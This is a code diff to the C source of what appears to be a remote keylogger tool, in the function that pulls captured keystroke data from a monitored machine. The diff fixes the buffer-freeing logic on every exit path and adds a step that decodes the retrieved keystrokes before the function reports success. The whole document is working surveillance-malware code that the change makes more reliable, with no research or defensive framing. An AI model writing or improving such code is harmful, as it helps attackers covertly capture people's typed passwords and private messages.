@@ -6,6 +6,8 @@
 #include "net/interface.h"
 #include "net/error.h"
 #include "progressbar.h"
+#include "kld/kld.h"
+#include "kld/error.h"
 
 #define COMMAND_KEYLOGGER_GET_DATA 0xF
 #define COMMAND_KEYLOGGER_GET_END 0xE
@@ -16,11 +18,10 @@ int command_Keylogger_Get(char* msg, int len)
 {
 	FILE *f = fopen(msg, "w");
 
-	free(msg);
-
 	if(!f)
 	{
 		LOG(LOG_ERR, "Cannot create the file!\n");
+		free(msg);
 
 		return COMMANDS_SUCC;
 	}
@@ -28,6 +29,7 @@ int command_Keylogger_Get(char* msg, int len)
 	if(net_SendCmd((uint8*)" ", 1, COMMANDS_KEYLOGGER_GET) == NET_LOST_CONNECTION)
 	{
 		LOG(LOG_ERR, "Failed to send!\n");
+		free(msg);
 		fclose(f);
 
 		return NET_LOST_CONNECTION;
@@ -41,6 +43,7 @@ int command_Keylogger_Get(char* msg, int len)
 	{
 		LOG(LOG_ERR, "Failed to receive!\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return NET_LOST_CONNECTION;
@@ -48,6 +51,7 @@ int command_Keylogger_Get(char* msg, int len)
 	}else if(rv == NET_TIMED_OUT){
 		LOG(LOG_ERR, "Time out!\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return NET_LOST_CONNECTION;
@@ -57,6 +61,7 @@ int command_Keylogger_Get(char* msg, int len)
 	{
 		LOG(LOG_ERR, "The keylogger may not be running ?\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return COMMANDS_SUCC;
@@ -74,6 +79,7 @@ int command_Keylogger_Get(char* msg, int len)
 	{
 		LOG(LOG_ERR, "Failed to receive!\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return NET_LOST_CONNECTION;
@@ -81,6 +87,7 @@ int command_Keylogger_Get(char* msg, int len)
 	}else if(rv == NET_TIMED_OUT){
 		LOG(LOG_ERR, "Time out!\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return NET_LOST_CONNECTION;
@@ -90,6 +97,7 @@ int command_Keylogger_Get(char* msg, int len)
 	{
 		LOG(LOG_ERR, "Failed to retrive keylogger data!\n");
 		free(rmsg);
+		free(msg);
 		fclose(f);
 
 		return COMMANDS_SUCC;
@@ -115,6 +123,7 @@ int command_Keylogger_Get(char* msg, int len)
 		{
 			progressbar_CriticalStop();
 			fclose(f);
+			free(msg);
 			free(rmsg);
 
 			return NET_LOST_CONNECTION;
@@ -136,16 +145,27 @@ int command_Keylogger_Get(char* msg, int len)
 	if(rv == NET_LOST_CONNECTION)
 	{
 		LOG(LOG_ERR, "Failed to receive!\n");
+		free(msg);
 
 		return NET_LOST_CONNECTION;
 
 	}else if(rv == NET_TIMED_OUT){
 		LOG(LOG_ERR, "Time out!\n");
+		free(msg);
 
 		return NET_LOST_CONNECTION;
 	}
 
-	LOG(LOG_SUCC, "Done!\n");
+	LOG(LOG_INFO, "Decoding data...\n");
+
+	if(KLD_Decode(msg) != KLD_NO_ERROR)
+	{
+		LOG(LOG_ERR, "Failed to decode!\n");
+	}else{
+		LOG(LOG_SUCC, "Done!\n");
+	}
+
+	free(msg);
 
 	return COMMANDS_SUCC;
 }
